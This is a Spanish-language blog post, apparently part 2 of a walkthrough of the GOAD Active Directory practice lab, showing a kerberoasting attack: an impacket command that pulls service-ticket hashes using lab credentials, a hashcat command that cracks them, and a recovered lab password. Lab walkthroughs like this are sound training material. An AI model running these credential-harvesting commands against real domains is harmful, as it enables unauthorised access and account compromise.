---
layout: single
title: Game of Active Directory - Parte 2
excerpt: "En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios."
date: 2024-03-30
classes: wide
header:
  teaser: /assets/images/Goad/logo_GOAD.jpg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---


En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios.


## Kerberoasting

Podemos utilizar impacket para intentar explotar esta vulnerabilidad, que se da cuando algún usuario del dominio tiene asociado un SPN. 

```bash
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

![](/assets/images/Goad/kerberoasting.jpg)


Obtenemos 3 hashes que corresponden a los usuarios sansa.stark, jon.snow y sql_svc. Y ahora podemos intentar crackearlos con hashcat.

```bash
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```


![](/assets/images/Goad/hashcat_kerb.jpg)


Ya tenemos otra credencial: `jon.snow:iknownothing`



